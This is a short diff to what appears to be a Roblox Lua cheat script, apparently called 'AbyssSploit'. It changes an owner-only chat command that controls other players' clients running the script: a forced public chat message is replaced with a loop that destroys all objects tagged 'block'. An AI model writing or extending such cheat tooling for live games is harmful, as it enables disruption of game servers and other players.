@@ -5193,9 +5193,10 @@ task.spawn(function()
 					end)
 				end
    
-				if Message:lower() == "!bm default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!brmp default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('AbyssSploit On Top!', 'All');
+						for i, v in next, CollectionService:GetTagged("block") do
+							v:Destroy()
 						end
 					end)
 				end
